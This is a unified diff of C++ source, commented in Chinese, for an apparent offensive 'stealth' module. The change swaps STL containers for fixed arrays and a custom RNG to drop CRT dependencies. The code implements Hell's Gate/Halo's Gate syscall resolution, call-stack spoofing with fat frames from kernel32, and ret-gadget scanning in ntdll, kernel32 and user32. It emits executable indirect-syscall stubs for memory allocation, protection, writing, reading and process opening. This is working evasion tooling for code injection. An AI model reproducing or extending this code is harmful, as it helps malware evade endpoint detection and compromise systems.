@@ -8,15 +8,45 @@
 #include "platform.h"
 #include <winternl.h>
 #include <psapi.h>
-#include <algorithm>
-#include <random>
-#include <chrono>
+#include <initializer_list>
+// ★ BUILD 496: 移除 <algorithm> <random> <chrono> — CRT 堆依赖
 
 namespace stealth {
 
 // ============================================================
-// SyscallResolver — Hell's Gate + Halo's Gate 实现
+// ★ BUILD 496: 自实现 RNG + 辅助函数 — 替代 std::mt19937/chrono/find/min
+//   匿名命名空间避免与 memory_cloak.cpp 中的 SimpleRng 冲突
 // ============================================================
+namespace {
+    class SimpleRng {
+    public:
+        SimpleRng(uint32_t seed) : m_state(seed) {}
+        uint32_t Next() {
+            m_state = m_state * 1664525u + 1013904223u;
+            return m_state;
+        }
+    private:
+        uint32_t m_state;
+    };
+
+    uint32_t GetRngSeed() {
+        LARGE_INTEGER counter;
+        QueryPerformanceCounter(&counter);
+        return static_cast<uint32_t>(counter.LowPart ^ counter.HighPart);
+    }
+
+    // 手动 min 替代 std::min
+    template<typename T>
+    T MinVal(T a, T b) { return (a < b) ? a : b; }
+
+    // 手动 find 替代 std::find
+    bool FindInArray(const uintptr_t* arr, int count, uintptr_t val) {
+        for (int i = 0; i < count; i++) {
+            if (arr[i] == val) return true;
+        }
+        return false;
+    }
+}
 
 SyscallResolver& SyscallResolver::Instance() {
     static SyscallResolver instance;
@@ -352,7 +382,7 @@ SIZE_T CallStackSpoofer::GetFunctionStackSize(uintptr_t funcAddr) {
 }
 
 bool CallStackSpoofer::FindFatFrames() {
-    if (m_initialized) return !m_fatFrames.empty();
+    if (m_initialized) return m_fatFrameCount > 0;
 
     // 扫描 kernel32.dll 找到栈分配 >= 120 bytes 的函数
     HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
@@ -376,9 +406,10 @@ bool CallStackSpoofer::FindFatFrames() {
 
     uintptr_t modBase = reinterpret_cast<uintptr_t>(kernel32);
 
-    m_fatFrames.clear();
+    // ★ BUILD 496: 固定数组替代 std::vector
+    m_fatFrameCount = 0;
 
-    for (DWORD i = 0; i < count; i++) {
+    for (DWORD i = 0; i < count && m_fatFrameCount < MAX_FAT_FRAMES; i++) {
         uintptr_t funcAddr = modBase + runtimeFuncs[i].BeginAddress;
         SIZE_T stackSize = GetFunctionStackSize(funcAddr);
 
@@ -396,32 +427,30 @@ bool CallStackSpoofer::FindFatFrames() {
                     ctx.trampolineGadget = reinterpret_cast<uintptr_t>(funcStart + j);
                     ctx.spoofFrameSize = stackSize;
                     ctx.spoofedCallSite = funcAddr;
-                    m_fatFrames.push_back(ctx);
+                    m_fatFrames[m_fatFrameCount++] = ctx;
                     break;
                 }
             }
         }
     }
 
-    if (!m_fatFrames.empty()) {
+    if (m_fatFrameCount > 0) {
         // 随机选择一个作为默认
-        std::mt19937 rng(static_cast<unsigned>(
-            std::chrono::steady_clock::now().time_since_epoch().count()));
-        std::uniform_int_distribution<size_t> dist(0, m_fatFrames.size() - 1);
-        m_context = m_fatFrames[dist(rng)];
+        SimpleRng rng(GetRngSeed());
+        int idx = static_cast<int>(rng.Next() % static_cast<uint32_t>(m_fatFrameCount));
+        m_context = m_fatFrames[idx];
     }
 
     m_initialized = true;
-    return !m_fatFrames.empty();
+    return m_fatFrameCount > 0;
 }
 
 CallStackSpoofContext CallStackSpoofer::GetRandomSpoofContext() {
-    if (m_fatFrames.empty()) return {};
+    if (m_fatFrameCount == 0) return {};
 
-    std::mt19937 rng(static_cast<unsigned>(
-        std::chrono::steady_clock::now().time_since_epoch().count()));
-    std::uniform_int_distribution<size_t> dist(0, m_fatFrames.size() - 1);
-    return m_fatFrames[dist(rng)];
+    SimpleRng rng(GetRngSeed());
+    int idx = static_cast<int>(rng.Next() % static_cast<uint32_t>(m_fatFrameCount));
+    return m_fatFrames[idx];
 }
 
 bool CallStackSpoofer::Initialize() {
@@ -473,7 +502,8 @@ static bool IsValidEpilogueRet(BYTE* retAddr, BYTE* scanStart, SIZE_T scanLen) {
 }
 
 // 在一个模块的 .text 区段中扫描 ret gadgets
-static size_t ScanModuleForRetGadgets(HMODULE mod, std::vector<uintptr_t>& out, size_t maxPerModule) {
+// ★ BUILD 496: 固定数组替代 std::vector
+static size_t ScanModuleForRetGadgets(HMODULE mod, uintptr_t* out, int* outCount, int maxOut, size_t maxPerModule) {
     if (!mod) return 0;
 
     auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(mod);
@@ -496,12 +526,12 @@ static size_t ScanModuleForRetGadgets(HMODULE mod, std::vector<uintptr_t>& out, 
     size_t added = 0;
 
     // 从末尾向前搜索, 优先取函数边界上的 ret
-    for (SIZE_T i = textSize - 1; i > 0 && added < maxPerModule; i--) {
+    for (SIZE_T i = textSize - 1; i > 0 && added < maxPerModule && *outCount < maxOut; i--) {
         if (base[i] == 0xC3 && IsValidEpilogueRet(base + i, base, textSize)) {
             uintptr_t addr = textStart + i;
-            // 去重: 检查是否已存在
-            if (std::find(out.begin(), out.end(), addr) == out.end()) {
-                out.push_back(addr);
+            // 去重
+            if (!FindInArray(out, *outCount, addr)) {
+                out[(*outCount)++] = addr;
                 added++;
             }
         }
@@ -510,51 +540,48 @@ static size_t ScanModuleForRetGadgets(HMODULE mod, std::vector<uintptr_t>& out, 
     return added;
 }
 
-bool FindRetGadgets(std::vector<uintptr_t>& outGadgets, size_t targetCount) {
-    outGadgets.clear();
-    outGadgets.reserve(targetCount);
+// ★ BUILD 496: 固定数组替代 std::vector
+static uintptr_t s_cachedRetGadgets[MAX_RET_GADGETS];
+static int s_cachedRetGadgetCount = 0;
+static bool s_retGadgetsInitialized = false;
+
+bool FindRetGadgets(uintptr_t* outGadgets, int* outCount, int targetCount) {
+    if (!outGadgets || !outCount) return false;
+    *outCount = 0;
 
     // 按优先级扫描: ntdll → kernel32 → user32
-    // ntdll 的 ret gadgets 最"合法" (RtlVirtualUnwind 最不会怀疑)
     const wchar_t* dlls[] = { L"ntdll.dll", L"kernel32.dll", L"user32.dll" };
-    size_t perModule = targetCount / 3 + 4; // 每个模块取约 1/3
+    size_t perModule = static_cast<size_t>(targetCount) / 3 + 4;
 
     for (auto* dllName : dlls) {
         HMODULE mod = GetModuleHandleW(dllName);
         if (mod) {
-            ScanModuleForRetGadgets(mod, outGadgets, perModule);
+            ScanModuleForRetGadgets(mod, outGadgets, outCount, targetCount, perModule);
         }
     }
 
     // 如果不够, 继续从 ntdll 补充
-    if (outGadgets.size() < targetCount) {
+    if (*outCount < targetCount) {
         HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
         if (ntdll) {
-            ScanModuleForRetGadgets(ntdll, outGadgets, targetCount - outGadgets.size());
+            ScanModuleForRetGadgets(ntdll, outGadgets, outCount, targetCount,
+                static_cast<size_t>(targetCount) - *outCount);
         }
     }
 
-    return outGadgets.size() >= 4; // 至少需要 4 个才能形成有意义的链
+    return *outCount >= 4;
 }
 
-std::vector<uintptr_t> GetRetGadgets(size_t count) {
-    static std::vector<uintptr_t> s_cachedGadgets;
-    static bool s_initialized = false;
-
-    if (!s_initialized) {
-        FindRetGadgets(s_cachedGadgets, count);
-        // 通知 SyscallResolver StackSpoof 组件已就绪
-        if (s_cachedGadgets.size() >= 4) {
+int GetRetGadgetCount() {
+    if (!s_retGadgetsInitialized) {
+        s_cachedRetGadgetCount = 0;
+        FindRetGadgets(s_cachedRetGadgets, &s_cachedRetGadgetCount, MAX_RET_GADGETS);
+        if (s_cachedRetGadgetCount >= 4) {
             SyscallResolver::Instance().SetStackSpoofReady(true);
         }
-        s_initialized = true;
+        s_retGadgetsInitialized = true;
     }
-
-    // 如果缓存的够用, 直接返回副本
-    if (s_cachedGadgets.size() >= count) {
-        return std::vector<uintptr_t>(s_cachedGadgets.begin(), s_cachedGadgets.begin() + count);
-    }
-    return s_cachedGadgets; // 不够则返回全部
+    return s_cachedRetGadgetCount;
 }
 
 // ============================================================
@@ -780,12 +807,13 @@ void* GenerateSpoofedSyscallStub(DWORD ssn, uintptr_t syscallRetGadget,
 //   [rsp+0x30] = arg6 (重定位后)
 // ============================================================
 void* GenerateDeepSpoofStub(DWORD ssn, uintptr_t syscallRetGadget,
-                             const std::vector<uintptr_t>& retGadgets,
+                             const uintptr_t* retGadgets, int retGadgetCount,
                              const CallStackSpoofContext& spoofCtx)
 {
-    if (!IsValidSyscallGadget(syscallRetGadget) || retGadgets.empty()) return nullptr;
+    if (!IsValidSyscallGadget(syscallRetGadget) || retGadgetCount == 0) return nullptr;
 
-    size_t chainCount = std::min(retGadgets.size(), (size_t)4);
+    // ★ BUILD 496: 固定数组替代 std::vector
+    int chainCount = (retGadgetCount < 4) ? retGadgetCount : 4;
     if (chainCount < 4) return nullptr;
 
     // 代码布局 (107 字节，支持 arg5+arg6 重定位):
@@ -809,12 +837,15 @@ void* GenerateDeepSpoofStub(DWORD ssn, uintptr_t syscallRetGadget,
     // [97]  4C 8B 1D +disp_sys      mov r11, [rip+disp]   ; syscall;ret
     // [104] 41 FF E3                jmp r11
     const size_t totalCodeSize = 107;
-    const size_t dataSectionSize = (chainCount + 1) * 8;
+    const size_t dataSectionSize = (static_cast<size_t>(chainCount) + 1) * 8;
     const size_t totalSize = totalCodeSize + dataSectionSize;
 
-    std::vector<BYTE> stub(totalSize, 0x90);
-    BYTE* codePtr = stub.data();
-    BYTE* dataPtr = stub.data() + totalCodeSize;
+    // ★ BUILD 496: 栈上固定数组替代 std::vector<BYTE>
+    BYTE stub[256]; // 107 + (5*8) = 147 < 256
+    if (totalSize > sizeof(stub)) return nullptr;
+    memset(stub, 0x90, totalSize);
+    BYTE* codePtr = stub;
+    BYTE* dataPtr = stub + totalCodeSize;
 
     size_t off = 0;
 
@@ -894,7 +925,8 @@ void* GenerateDeepSpoofStub(DWORD ssn, uintptr_t syscallRetGadget,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!execMem) return nullptr;
 
-    memcpy(execMem, stub.data(), totalSize);
+    // ★ BUILD 496: stub 是栈数组
+    memcpy(execMem, stub, totalSize);
 
     DWORD oldProtect;
     if (!VirtualProtect(execMem, totalSize, PAGE_EXECUTE_READ, &oldProtect)) {
@@ -924,10 +956,10 @@ NTSTATUS ExecuteSyscall(const char* funcName, DWORD ssn,
     }
     case SyscallMethod::StackSpoof: {
         uintptr_t gadget = resolver.GetSyscallRetGadget();
-        auto retGadgets = GetRetGadgets(32);
+        int retGadgetCount = GetRetGadgetCount();
         auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
-        if (gadget && !retGadgets.empty()) {
-            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
+        if (gadget && retGadgetCount >= 4) {
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
         }
         break;
     }
@@ -979,10 +1011,10 @@ NTSTATUS name(__VA_ARGS__, SyscallMethod method) { \
     void* stub = nullptr; \
     if (m == SyscallMethod::StackSpoof) { \
         uintptr_t gadget = resolver.GetSyscallRetGadget(); \
-        auto retGadgets = GetRetGadgets(32); \
+        int retGadgetCount = GetRetGadgetCount(); \
         auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext(); \
-        if (gadget && !retGadgets.empty()) { \
-            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx); \
+        if (gadget && retGadgetCount >= 4) { \
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx); \
         } \
     } \
     if (!stub && (m == SyscallMethod::Indirect)) { \
@@ -1018,10 +1050,10 @@ NTSTATUS SysAllocateVirtualMemory(
     void* stub = nullptr;
     if (m == SyscallMethod::StackSpoof) {
         uintptr_t gadget = resolver.GetSyscallRetGadget();
-        auto retGadgets = GetRetGadgets(32);
+        int retGadgetCount = GetRetGadgetCount();
         auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
-        if (gadget && !retGadgets.empty()) {
-            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
+        if (gadget && retGadgetCount >= 4) {
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
         }
     }
     if (!stub && m == SyscallMethod::Indirect) {
@@ -1050,10 +1082,10 @@ NTSTATUS SysProtectVirtualMemory(
     void* stub = nullptr;
     if (m == SyscallMethod::StackSpoof) {
         uintptr_t gadget = resolver.GetSyscallRetGadget();
-        auto retGadgets = GetRetGadgets(32);
+        int retGadgetCount = GetRetGadgetCount();
         auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
-        if (gadget && !retGadgets.empty()) {
-            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
+        if (gadget && retGadgetCount >= 4) {
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
         }
     }
     if (!stub && m == SyscallMethod::Indirect) {
@@ -1082,10 +1114,10 @@ NTSTATUS SysWriteVirtualMemory(
     void* stub = nullptr;
     if (m == SyscallMethod::StackSpoof) {
         uintptr_t gadget = resolver.GetSyscallRetGadget();
-        auto retGadgets = GetRetGadgets(32);
+        int retGadgetCount = GetRetGadgetCount();
         auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
-        if (gadget && !retGadgets.empty()) {
-            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
+        if (gadget && retGadgetCount >= 4) {
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
         }
     }
     if (!stub && m == SyscallMethod::Indirect) {
@@ -1114,10 +1146,10 @@ NTSTATUS SysReadVirtualMemory(
     void* stub = nullptr;
     if (m == SyscallMethod::StackSpoof) {
         uintptr_t gadget = resolver.GetSyscallRetGadget();
-        auto retGadgets = GetRetGadgets(32);
+        int retGadgetCount = GetRetGadgetCount();
         auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
-        if (gadget && !retGadgets.empty()) {
-            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
+        if (gadget && retGadgetCount >= 4) {
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
         }
     }
     if (!stub && m == SyscallMethod::Indirect) {
@@ -1146,10 +1178,10 @@ NTSTATUS SysOpenProcess(
     void* stub = nullptr;
     if (m == SyscallMethod::StackSpoof) {
         uintptr_t gadget = resolver.GetSyscallRetGadget();
-        auto retGadgets = GetRetGadgets(32);
+        int retGadgetCount = GetRetGadgetCount();
         auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
-        if (gadget && !retGadgets.empty()) {
-            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
+        if (gadget && retGadgetCount >= 4) {
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
         }
     }
     if (!stub && m == SyscallMethod::Indirect) {
@@ -1178,10 +1210,10 @@ NTSTATUS SysQuerySystemInformation(
     void* stub = nullptr;
     if (m == SyscallMethod::StackSpoof) {
         uintptr_t gadget = resolver.GetSyscallRetGadget();
-        auto retGadgets = GetRetGadgets(32);
+        int retGadgetCount = GetRetGadgetCount();
         auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
-        if (gadget && !retGadgets.empty()) {
-            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
+        if (gadget && retGadgetCount >= 4) {
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
         }
     }
     if (!stub && m == SyscallMethod::Indirect) {
@@ -1210,10 +1242,10 @@ NTSTATUS SysQueryInformationProcess(
     void* stub = nullptr;
     if (m == SyscallMethod::StackSpoof) {
         uintptr_t gadget = resolver.GetSyscallRetGadget();
-        auto retGadgets = GetRetGadgets(32);
+        int retGadgetCount = GetRetGadgetCount();
         auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
-        if (gadget && !retGadgets.empty()) {
-            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
+        if (gadget && retGadgetCount >= 4) {
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
         }
     }
     if (!stub && m == SyscallMethod::Indirect) {
@@ -1239,10 +1271,10 @@ NTSTATUS SysClose(HANDLE handle, SyscallMethod method) {
     void* stub = nullptr;
     if (m == SyscallMethod::StackSpoof) {
         uintptr_t gadget = resolver.GetSyscallRetGadget();
-        auto retGadgets = GetRetGadgets(32);
+        int retGadgetCount = GetRetGadgetCount();
         auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
-        if (gadget && !retGadgets.empty()) {
-            stub = GenerateDeepSpoofStub(ssn, gadget, retGadgets, spoofCtx);
+        if (gadget && retGadgetCount >= 4) {
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
         }
     }
     if (!stub && m == SyscallMethod::Indirect) {
